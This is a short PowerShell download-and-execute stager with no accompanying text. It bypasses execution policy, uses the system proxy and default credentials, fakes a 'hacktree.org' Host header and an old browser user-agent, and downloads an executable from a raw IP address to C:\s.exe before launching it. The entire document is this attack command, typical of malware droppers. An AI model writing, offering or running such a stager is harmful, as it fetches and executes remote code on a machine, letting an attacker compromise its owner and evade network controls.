powershell -exec bypass -c
$u="http://85.192.63.184/s.exe";
$p=[System.Net.WebRequest]::GetSystemWebProxy();
$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
$w=New-Object net.webclient;
$w.Headers.add('Host','hacktree.org')
$w.Headers.add('user-agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;')
$w.proxy=$p;
$w.UseDefaultCredentials=$true;
$s=$w.DownloadFile($u,"C:\s.exe");Start-Process "C:\s.exe";